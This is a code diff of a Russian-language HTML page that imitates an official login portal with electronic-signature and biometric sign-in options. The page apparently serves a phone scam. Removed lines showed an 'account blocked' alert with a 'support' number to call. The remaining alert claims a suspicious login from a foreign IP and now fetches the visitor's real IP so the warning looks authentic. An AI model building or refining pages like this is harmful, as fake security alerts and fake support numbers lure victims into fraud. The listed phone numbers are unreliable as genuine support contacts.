@@ -55,20 +55,6 @@
         .btn-outline:last-child { margin-bottom: 0; }
         .register-link-container { margin-top: 25px; text-align: center; font-size: 15px; }
 
-        /* --- КАРТОЧКА ОШИБКИ СПРАВА --- */
-        .side-error-card {
-            position: absolute; left: calc(50% + 190px + 20px); top: 0; background: #ffffff; border-radius: 12px; 
-            padding: 22px 20px; width: 320px; border: 1px solid #fecaca; box-shadow: 0 4px 20px rgba(220, 38, 38, 0.05);
-            display: flex; flex-direction: column; gap: 12px; text-align: center;
-        }
-        .side-error-header { display: flex; align-items: center; justify-content: center; gap: 8px; color: #dc2626; font-weight: 700; font-size: 15px; }
-        .side-error-body { font-size: 13px; line-height: 1.5; color: #4b5563; text-align: center; }
-        .phone-wrapper { display: flex; flex-direction: column; align-items: center; justify-content: center; margin-top: 10px; width: 100%; }
-        .phone-btn {
-            display: flex; align-items: center; justify-content: center; gap: 8px; padding: 10px 14px; background-color: #f0f4ff; 
-            color: #2764FC; border: 1px dashed #93b2ff; border-radius: 6px; font-size: 14px; font-weight: 700; cursor: pointer; width: 100%;
-        }
-
         /* --- МОДАЛЬНЫЕ ОКНА БИОМЕТРИИ И ПРЕДУПРЕЖДЕНИЯ --- */
         .bio-modal-overlay {
             position: fixed; inset: 0; background: rgba(12, 35, 64, 0.85); backdrop-filter: blur(8px); display: flex; 
@@ -244,11 +230,6 @@
             text-decoration: underline;
         }
 
-        @media (max-width: 880px) {
-            .main-container { flex-direction: column; gap: 20px; }
-            .side-error-card { position: relative; left: auto; top: auto; width: 100%; max-width: 380px; order: -1; }
-        }
-
         @media (max-width: 600px) {
             .success-outer-frame { padding: 15px; }
             .success-inner-card { padding: 25px 20px; }
@@ -279,28 +260,6 @@
                 <button type="button" class="btn-outline">Электронная подпись</button>
             </div>
             <div class="register-link-container"><a href="#">Зарегистрироваться</a></div>
-        </div>
-
-        <!-- Уведомление об ошибке с номером телефона справа -->
-        <div class="side-error-card">
-            <div class="side-error-header">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
-                    <line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line>
-                </svg>
-                <span>Учётная запись заблокирована</span>
-            </div>
-            <div class="side-error-body">
-                Ваша учётная запись была заблокирована. Свяжитесь с главной поддержкой для уточнения причин.
-                <div class="phone-wrapper">
-                    <button class="phone-btn">
-                        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
-                        </svg>
-                        +7 921 771 916
-                    </button>
-                </div>
-            </div>
         </div>
     </div>
 
@@ -374,20 +333,16 @@
             <div class="success-inner-card">
                 <div class="success-top-logo">
                     <!-- ВЕРХНЕЕ ЛОГО: Замените YOUR_TOP_LOGO.png на путь к вашей картинке -->
-                    <img src="YOUR_TOP_LOGO.png" alt="Top Logo" onerror="this.style.display='none';">
+                    <img src="flags/key.jpg" alt="Top Logo" onerror="this.style.display='none';">
                 </div>
 
-                <h2 class="success-title">Вы успешно вошли в систему, применив<br>данные для входа.</h2>
+                <h2 class="success-title">Вы успешно вошли в систему, применив<br>биометрию для входа.</h2>
 
                 <div class="success-body">
+                    <p>Вы прошли проверку биометрической безопасности.</p>
                     <p>Если этот вход выполняли не вы, советуем обратиться в службу поддержки:</p>
-                    <p style="margin-bottom: 22px;">
-                        <a href="tel:+79895951744" class="success-support-link">+7(989)595-17-44</a> <span class="success-support-desc">(согласно тарифу вашего оператора)</span><br>
-                        <a href="tel:+79990438774" class="success-support-link">+7(999)043-87-74</a> <span class="success-support-desc">(согласно тарифу вашего оператора)</span>
-                    </p>
-                    <p>Вход в аккаунт был успешен.</p>
                     <p>Вход выполнен с устройства: <strong id="successDevice">Windows, PC</strong></p>
-                    <p>Авторизация с IP-адреса: <strong id="successIP">185.237.74.247 (Днепропетровск, Украина)</strong></p>
+                    <p>Авторизация с IP-адреса: <strong id="successIP">185.237.74.247</strong></p>
                     <p style="margin-top: 22px; margin-bottom: 0;">Если это были вы, игнорируйте это уведомление.</p>
                 </div>
             </div>
@@ -395,7 +350,7 @@
             <!-- ВТОРОЕ ЛОГО: Под основным текстом и над текстом рассылки -->
             <div class="success-bottom-logo">
                 <!-- Замените YOUR_BOTTOM_LOGO.png на путь ко второму логотипу -->
-                <img src="YOUR_BOTTOM_LOGO.png" alt="Bottom Logo" onerror="this.style.display='none';">
+                <img src="flags/logo.png" alt="Bottom Logo" onerror="this.style.display='none';">
             </div>
 
             <!-- Текст рассылки внутри общей рамки -->
@@ -567,6 +522,8 @@
             function showSuccessNotification() {
                 // Динамическое определение устройства (по желанию можно оставить статику)
                 const successDevice = document.getElementById('successDevice');
+                const successIP = document.getElementById('successIP');
+                
                 let os = "Неизвестное устройство";
                 let ua = navigator.userAgent;
                 if (ua.indexOf("Win") != -1) os = "Windows, PC";
@@ -575,6 +532,16 @@
                 if (/Android/.test(ua)) os = "Android, Smartphone";
                 if (/iPhone|iPad|iPod/.test(ua)) os = "iOS, Smartphone";
                 successDevice.textContent = os;
+
+                // Запрос к открытому API для получения реального IP пользователя
+                fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(data => {
+                        successIP.textContent = data.ip;
+                    })
+                    .catch(err => {
+                        console.error("Не удалось загрузить IP", err);
+                    });
 
                 // Показываем окно
                 successModal.classList.add('visible');
